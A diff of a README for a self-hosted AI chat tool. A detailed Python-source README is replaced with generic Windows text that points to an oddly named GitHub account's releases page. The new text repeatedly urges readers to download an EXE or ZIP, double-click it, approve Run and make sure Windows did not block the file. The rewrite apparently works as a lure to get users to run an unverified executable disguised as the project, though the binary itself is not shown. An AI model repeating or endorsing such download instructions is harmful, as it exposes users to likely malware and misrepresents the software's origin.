@@ -1,339 +1,299 @@
-<div align="center">
+# 🖥️ surf - Run AI chats your way
 
-<img src="assets/banner.svg" alt="SURF — Search · Understand · Reason · Fast" width="100%"/>
+[![Download surf](https://img.shields.io/badge/Download-surf-4B9CD3?style=for-the-badge)](https://github.com/driftfishquakergun623/surf/releases)
 
-<br/>
+## 🚀 What surf does
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
-[![Flask](https://img.shields.io/badge/Flask-3.0-000000?style=flat-square&logo=flask&logoColor=white)](https://flask.palletsprojects.com)
-[![Ollama](https://img.shields.io/badge/Ollama-local%20models-black?style=flat-square&logo=ollama&logoColor=white)](https://ollama.ai)
-[![Playwright](https://img.shields.io/badge/Playwright-browser%20agent-45ba4b?style=flat-square&logo=playwright&logoColor=white)](https://playwright.dev)
-[![License: MIT](https://img.shields.io/badge/License-MIT-818cf8?style=flat-square)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-555?style=flat-square)]()
+surf is a self-hosted AI chat app for Windows. It gives you a web UI and a terminal CLI in one tool. You can connect it to models from Ollama, OpenAI, and Anthropic. You can also use web search, browser agent tools, persistent memory, and usage analytics.
 
-<br/>
+Use surf if you want one place to chat with AI, test prompts, and keep your chats in your own setup.
 
-**A self-hosted AI chat with a sleek web UI and a rich terminal CLI.**  
-Connect any model. Search the web for free. Automate your browser. Remember everything.
+## 📥 Download surf
 
-</div>
+1. Open the [surf releases page](https://github.com/driftfishquakergun623/surf/releases)
+2. Find the latest release at the top of the page
+3. In the Assets list, download the Windows file
+4. Save the file to your PC
+5. If the file is a ZIP, extract it first
+6. If the file is an EXE, double-click it to run it
 
----
+For most users, the release page is the only place you need to visit to get the app.
 
-# SURF — Search · Understand · Reason · Fast
+## 🖱️ How to install on Windows
 
-A self-hosted AI chat with a polished web UI and a rich CLI. Connect to any model — local or cloud — with free built-in web search, persistent memory, a browser automation agent, and a full analytics dashboard.
+### 1. Get the file
+Download the latest Windows build from the release page.
 
----
+### 2. Open the download
+If Windows shows the file in the bottom bar of your browser, click it.  
+If you saved it to Downloads, open that folder.
 
-## Preview
+### 3. Extract the app if needed
+If the download is a ZIP file:
 
-<div align="center">
+- Right-click the ZIP file
+- Select Extract All
+- Choose a folder
+- Open the extracted folder
 
-### Web UI
-<img src="assets/preview.svg" alt="SURF Web UI" width="100%"/>
+### 4. Start surf
+Look for the main app file, then:
 
-<br/>
+- Double-click the `.exe` file to open the app
+- If Windows asks for approval, select Run
 
-### Terminal CLI
-<img src="assets/cli-preview.svg" alt="SURF CLI" width="90%"/>
+### 5. Keep the files together
+If the app came in a folder, keep all files in the same place. Do not move one file without the others.
 
-</div>
+## 🌐 First-time setup
 
----
+When surf opens for the first time, you will set up your AI provider. You can use one of these:
 
-## Features
+- Ollama for local models on your own machine
+- OpenAI for cloud-based models
+- Anthropic for Claude models
 
-<table>
-<tr>
-<td width="50%">
+You may also set up:
 
-**🦙 Any AI Provider**  
-Ollama (local), Anthropic Claude, OpenAI GPT, OpenRouter, or any OpenAI-compatible endpoint. Switch mid-conversation with `/provider`.
+- A web search source for live lookup
+- Browser automation for tasks in a web page
+- Memory so surf can keep useful context
+- Analytics so you can review usage patterns
 
-</td>
-<td width="50%">
+## 🔑 Add your model provider
 
-**🔍 Free Web Search**  
-DuckDuckGo search with no API key and no quota. Multi-source synthesis powered by Playwright. Works in both web UI and CLI.
+### Ollama
+Use Ollama if you want to run models on your own computer. You will need Ollama installed and running before surf can connect to it.
 
-</td>
-</tr>
-<tr>
-<td>
+Typical setup steps:
 
-**🤖 Browser Agent**  
-Vision-powered autonomous browsing. Give a task in plain English — SURF opens a real browser, takes screenshots, and executes: click, type, scroll, navigate.
+- Open Ollama
+- Make sure your model is available
+- Copy the local endpoint settings into surf if asked
+- Pick your model in the app
 
-</td>
-<td>
+### OpenAI
+Use OpenAI if you want to connect to hosted models.
 
-**🧠 Persistent Memory**  
-Global facts survive across all conversations. Session facts are auto-extracted and deduplicated. Fully editable via sidebar or the Memory modal.
+Typical setup steps:
 
-</td>
-</tr>
-<tr>
-<td>
+- Get your API key from your OpenAI account
+- Open surf settings
+- Paste the API key in the provider field
+- Choose the model you want to use
 
-**📄 Conversation Summariser**  
-One-click AI summary of any conversation — structured into Topic, Key Points, and Outcome. Optionally save to memory with a toggle.
+### Anthropic
+Use Anthropic if you want to use Claude models.
 
-</td>
-<td>
+Typical setup steps:
 
-**📖 Skills System**  
-Drop a Markdown file into `skills/` to give SURF new capabilities. Built-in: Web Researcher and File Reader. Enable/disable per-session.
+- Get your API key from Anthropic
+- Open surf settings
+- Enter the key
+- Select a Claude model
 
-</td>
-</tr>
-<tr>
-<td>
+## 💬 Use the web app
 
-**📊 Analytics Dashboard**  
-Track messages, token counts, tokens/sec, response times, and model usage breakdowns across every conversation — all rendered locally.
+The web UI is the easiest way to use surf.
 
-</td>
-<td>
+You can use it to:
 
-**👁 Vision & Images**  
-Upload images in the web UI or attach via `/image` in the CLI. A dedicated vision model slot routes image messages automatically.
+- Start a new chat
+- Switch between models
+- Review past conversations
+- Save prompts you use often
+- Use tools during a chat
+- Keep memory across sessions
 
-</td>
-</tr>
-</table>
+To begin:
 
----
+1. Open surf
+2. Go to the chat screen
+3. Pick your model
+4. Type your message
+5. Press Send
 
-## Quick Start
+## ⌨️ Use the terminal CLI
 
-### Windows
-
-```powershell
-.\setup.ps1
-```
+surf also includes a command-line mode for users who prefer a terminal window.
 
-### macOS / Linux
+Use the CLI if you want to:
 
-```bash
-chmod +x setup.sh && ./setup.sh
-```
+- Run quick prompts
+- Work from PowerShell or Command Prompt
+- Automate tasks
+- Keep your workflow in the terminal
 
-### Manual setup
+Basic use:
 
-```bash
-python -m venv venv
-source venv/bin/activate          # Windows: .\venv\Scripts\Activate.ps1
-pip install -r requirements.txt
-playwright install chromium
-```
+- Open Command Prompt or PowerShell
+- Run the surf command from the app folder
+- Type your prompt
+- Read the response in the terminal
 
-### Run — CLI
+If you are not used to terminals, the web UI is the better place to start.
 
-```bash
-python chat.py                              # Ollama (default, auto-starts)
-python chat.py --search                     # Start with web search on
-python chat.py -p anthropic                 # Anthropic Claude
-python chat.py -p openai                    # OpenAI GPT
-python chat.py -p openrouter                # OpenRouter
-python chat.py -p custom -u http://localhost:1234/v1 -m my-model
-```
+## 🔎 Web search
 
-### Run — Web UI
+surf can use web search to find current information.
 
-```bash
-python chat.py --web                        # opens http://localhost:7777
-# or from inside the CLI:
-/web
-```
+This helps when you need:
 
----
+- News
+- Product details
+- Recent documentation
+- Facts that change often
 
-## CLI Commands
+When web search is on, surf can look up results before it answers. This can help it give more current replies.
 
-Type `/` to open the interactive slash-command menu (with tab completion).
+## 🤖 Browser agent automation
 
-| Command | Description |
-|---------|-------------|
-| `/search` | Toggle web search on / off |
-| `/think` | Toggle thinking-block display |
-| `/stream` | Toggle live streaming |
-| `/model <name>` | Switch model |
-| `/models` | List available Ollama models |
-| `/vision <name>` | Set a dedicated vision model (e.g. `llama3.2-vision`) |
-| `/image <path>` | Attach a local image to the next message |
-| `/provider <name>` | Switch provider (`ollama` / `anthropic` / `openai` / `openrouter` / `custom`) |
-| `/key <provider> <key>` | Set an API key |
-| `/url <base_url>` | Set a custom API base URL |
-| `/summarize` | AI-generated summary of the current conversation |
-| `/research <topic>` | Deep research mode — searches, reads pages, synthesises |
-| `/new` | Start a new conversation |
-| `/clear` | Clear conversation history |
-| `/status` | Show current settings |
-| `/web [port]` | Launch the web UI (default port 7777) |
-| `/help` | List all commands |
-| `/quit` | Exit |
+surf includes browser agent features for simple web tasks.
 
----
+You can use this for:
 
-## Web UI
+- Filling forms
+- Clicking pages
+- Checking page content
+- Moving through browser steps
 
-Open `http://localhost:7777` after running with `--web`.
+This is useful when you want the AI to help with web work instead of only chat text.
 
-**Sidebar**
-- Provider selector, chat model and vision model dropdowns
-- Feature toggles: web search, thinking, streaming, agent mode, stats overlay
-- Code syntax-highlight theme picker
-- Global and session memory panels
+## 🧠 Persistent memory
 
-**Topbar**
-- 📊 **Stats** — analytics dashboard (overview, model breakdown, speed, conversation history)
-- 📖 **Skills** — enable / disable skill modules
-- 🧠 **Memory** — view and edit remembered facts
-- 📄 **Summarize** — generate a structured AI summary of the current chat
+surf can keep memory across sessions.
 
-**Chat**
-- Markdown rendering with syntax-highlighted code blocks
-- Image upload (camera icon) — auto-routed through the vision model if set
-- Slash-command menu (type `/` in the input)
-- Conversation branching — fork from any assistant message
+That means it can remember things such as:
 
----
+- Your preferred style
+- Common tasks
+- Ongoing project details
+- Useful context from earlier chats
 
-## Browser Agent
+You can control what stays saved, so the app can keep the right context without forcing you to repeat yourself each time.
 
-Gives SURF eyes and hands. When agent mode is enabled, SURF can:
+## 📊 Analytics
 
-1. Open a real Chromium browser (headless)
-2. Take screenshots at each step
-3. Send the screenshot to your vision model (or extract structured elements for non-vision models)
-4. Decide and execute actions: `navigate`, `click`, `type`, `scroll`, `wait`, `done`
+surf includes analytics so you can review how you use the app.
 
-Enable in the web UI sidebar or with `/agent` in the CLI.
+This can help you track:
 
-Screenshots of each step are saved to `agent_screenshots/`.
+- Which models you use most
+- How often you chat
+- Which tools you use
+- Usage over time
 
----
+If you run surf for work or study, this can help you see patterns in how you use it.
 
-## Memory
+## 🖥️ Windows requirements
 
-SURF maintains two memory scopes:
+surf is built for modern Windows PCs.
 
-- **Global** — persisted in `surf_memory.json`, available in every conversation
-- **Session** — auto-extracted during the chat, cleared when the conversation ends
+Recommended setup:
 
-Manage memories from the web sidebar, the Memory topbar button, or the `/clear` command. Facts are deduplicated automatically.
+- Windows 10 or Windows 11
+- A recent browser
+- At least 8 GB RAM
+- 2 GB free disk space
+- Internet access for cloud models and web search
 
----
+For local models with Ollama, a stronger PC helps. More RAM and a newer GPU can improve speed.
 
-## Skills
+## 🧩 Common file types you may see
 
-Skills are Markdown files in `skills/<name>/SKILL.md` with a YAML front-matter header:
+When you download surf, you may see one of these:
 
-```yaml
----
-name: Web Researcher
-description: Search the web and synthesize information
-icon: 🌐
-enabled: true
----
-```
+- `.exe` — double-click to run
+- `.zip` — extract first, then run
+- `.msi` — follow the Windows install window
+- folder with app files — keep everything together and open the main app file
 
-Built-in skills:
-| Skill | Description |
-|-------|-------------|
-| **Web Researcher** | Real-time search + multi-source synthesis with citations |
-| **File Reader** | Read and analyse workspace files (disabled by default) |
+## 🛠️ If the app does not start
 
-Add a new skill by dropping a folder + `SKILL.md` into `skills/`.
+Try these steps:
 
----
+1. Make sure the download finished fully
+2. If it is a ZIP file, extract it first
+3. Run the app again
+4. Check that Windows did not block the file
+5. Make sure all required files stay in the same folder
+6. Restart your PC if the app still does not open
 
-## MCP Server
+If the app opens but does not connect to a model, check your API key, model name, and local Ollama service.
 
-Expose SURF's search capabilities as tools for Claude Desktop or any MCP client:
+## 🔐 Keep your keys safe
 
-```bash
-python core/mcp_server.py
-```
+If you use OpenAI or Anthropic, your API key is personal.
 
-Tools: `web_search`, `fetch_webpage`, `web_research`
+Good habits:
 
----
+- Do not share your key
+- Store it only in surf settings or your trusted password manager
+- Remove old keys you no longer use
+- Use the right provider for the model you want
 
-## Using as a Library
+## 🧭 Basic workflow
 
-```python
-from core.ai_search import search, fetch, research, news_search
+A simple way to use surf:
 
-results = search("Python async patterns")       # DuckDuckGo results
-page    = fetch("https://docs.python.org")       # Fetch + extract page text
-info    = research("what is retrieval-augmented generation")  # Search + read top pages
-news    = news_search("AI updates today")        # Latest news
-```
+1. Install the app
+2. Connect a model provider
+3. Turn on web search if you need live info
+4. Use the web UI for chat
+5. Use the CLI for quick terminal work
+6. Save useful memory for later sessions
 
----
+## 📁 Folder layout after setup
 
-## API Keys
+Your surf folder may include:
 
-Pass via environment variable or the `/key` command:
+- The main app file
+- Settings files
+- Model config files
+- Logs
+- Cache files
+- A folder for memory or session data
 
-```bash
-export ANTHROPIC_API_KEY=sk-ant-...
-export OPENAI_API_KEY=sk-...
-export OPENROUTER_API_KEY=sk-or-...
-```
+Keep this folder in a safe place if you want your settings and saved data to stay intact.
 
-Keys are stored locally in `surf_keys.json` when set with `/key`.
+## ❓ What you can do with surf
 
----
+You can use surf for:
 
-## Project Structure
+- Daily chat with AI
+- Writing help
+- Research
+- Local model testing
+- Web-based tasks
+- Repeating prompt workflows
+- Project notes and memory
+- Model comparison
 
-```
-surf/
-├── chat.py                 ← Entry point
-├── core/
-│   ├── surf.py             ← CLI — providers, commands, Rich UI
-│   ├── web_ui.py           ← Flask web server + REST/SSE API
-│   ├── browser_agent.py    ← Playwright autonomous browser agent
-│   ├── ai_search.py        ← DuckDuckGo search + page fetching
-│   ├── ai_tools.py         ← Chat function factories (Ollama, Anthropic, OpenAI…)
-│   ├── mcp_server.py       ← MCP server for Claude Desktop
-│   └── quick_chat.py       ← Lightweight single-shot CLI
-├── skills/
-│   ├── web_researcher/     ← Web search + synthesis skill
-│   └── file_reader/        ← File reading skill
-├── static/
-│   ├── index.html          ← Web UI (single-page app)
-│   ├── css/style.css
-│   └── js/app.js
-├── assets/                 ← README graphics
-├── agent_screenshots/      ← Browser agent step captures
-├── surf_chats.json         ← Saved conversations
-├── surf_memory.json        ← Persistent memory facts
-├── surf_stats.json         ← Usage analytics
-└── surf_keys.json          ← Stored API keys
-```
+## 🧪 Best first test
 
----
+After install, try this simple test:
 
-## Requirements
+- Open surf
+- Connect one model
+- Ask: What can you do?
+- Turn on web search and ask a current question
+- Save a memory item if the app offers it
+- Open the terminal CLI and send one short prompt
 
-- Python 3.10+
-- Ollama for local models — [ollama.ai](https://ollama.ai)
-- Chromium (installed by `playwright install chromium`) for web search and browser agent
+## 📦 Download and run
 
-See [requirements.txt](requirements.txt) for the full Python dependency list.
+Visit the [surf releases page](https://github.com/driftfishquakergun623/surf/releases), download the latest Windows file, and run it on your PC
 
----
+## 🧭 Tips for a smooth start
 
-## License
+- Use the latest release
+- Start with one model provider
+- Test the web UI before the CLI
+- Keep your API key ready if you use cloud models
+- Leave the app files in one folder
+- Use Ollama if you want local control
+- Use OpenAI or Anthropic if you want hosted models
 
-MIT
+## 📌 What to expect in surf
 
----
-
-<div align="center">
-<sub>Built with 🖤 — local-first, no tracking, no cloud lock-in</sub>
-</div>
+surf brings chat, search, browser tools, memory, and analytics into one app. That makes it useful if you want fewer tools to manage and one place to keep your AI work
